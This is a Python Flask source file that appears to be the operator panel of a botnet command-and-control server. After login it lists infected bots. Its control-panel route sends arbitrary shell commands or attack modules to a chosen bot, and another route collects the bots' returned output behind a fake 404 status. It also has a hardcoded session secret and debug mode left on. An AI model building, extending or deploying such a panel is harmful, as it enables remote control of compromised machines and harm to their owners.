# Importing flask module in the project is mandatory
# An object of Flask class is our WSGI application.

#inbuilt Modules 
from flask import Flask,request,render_template,session,jsonify
from random import randint
from binascii import unhexlify
from time import strftime, localtime
#built Modules
from server.starter import login,rhandler,web
# Flask constructor takes the name of 
# current module (__name__) as argument.

app = Flask(__name__)
app.secret_key = "hello"
# Sample responses
# The route() function of the Flask class is a decorator, 
# which tells the application which URL should call 
# the associated function.

@app.route('/',methods=['GET', 'POST'])
# ‘/’ URL is bound with hello_world() function.
def index():
    if request.method == "POST":
        query = request.form
        username = query['username']
        password = query['password']
        if login(username,password):
            session.permanent = True
            session["username"] = username
            return render_template('index.html',botlist=web.botlist,strftime=strftime,localtime=localtime,unhexlify=unhexlify)
        else:
            return render_template("login.html")
    else:
        if "username" in session:
            return render_template('index.html',botlist=web.botlist,strftime=strftime,localtime=localtime,unhexlify=unhexlify)
        
        return render_template("login.html")

# @app.route('/index')
# def index():
#     return render_template("index.html")

@app.route('/sendcommand',methods=['GET', 'POST'])
def sendcommand():
    response = rhandler.do_GET(request.cookies)
    print(response)
    return response


@app.route('/cp/<bot_uid>', methods=['GET', 'POST'])
def cp(bot_uid):
    command_type = request.form.get('command_type')
    module_type = request.form.get('select_modules')
    #print(module_type)
    bot_uid = bot_uid
    modres = ""
    if module_type == None or module_type=="":
        info = []
    else:
        info = web.selectedModulesOpt(module_type)
    if request.method == "POST":
        query = request.form
        print(query)
        if query['command_type'] == 'Shell' and 'select_modules' not in query:
            command = query['command']
            response = web.shellCommand(command,bot_uid)
            #print(bot_uid)
            #print(response)
        if query['command_type'] == "modules" and 'select_modules' in query:
            keys = web.getPostKeyName(query['select_modules'])
            print(keys)
            setoptions = []
            if keys!= []:
                for key in keys:
                    if key in query:
                        setoptions.append(query[key]) 
                        print("key is in query ","\n"*5)   
                        modres = web.runModule(set_options=setoptions,module_name=query['select_modules'],bot_uid=bot_uid)
                else:
                    pass
            else:
                print("Keys are empty")
                modres = web.runModule(set_options=setoptions,module_name=query['select_modules'],bot_uid=bot_uid)
                print(modres)
    
    return render_template('controlpanel.html', command_type=command_type, module_type=module_type,bot_uid=bot_uid,modules_list=web.get_module_list,infos=info,modres=modres)


# @app.route('/get_responses')
# def get_responses():
#     return jsonify([f"Response\n {randint(0,9)}", f"Response {randint(0,9)}", f"Response {randint(0,9)}"])
# main driver function
responses = []
@app.route("/get_responses",methods=['GET', 'POST'])
def getResponse():
    if request.method == "POST":
        data = request.form
        data = rhandler.do_POST(data)
        responses.append(data)
        return "True",404
    if responses != []:
        value = responses.pop()
    else:
        value = ""
    print(jsonify(value))
    return jsonify([value])

@app.route('/logout')
def logout():
    session.pop("username", None)
    return render_template("login.html")

if __name__ == '__main__':

    # run() method of Flask class runs the application 
    # on the local development server.
    app.run(debug=True)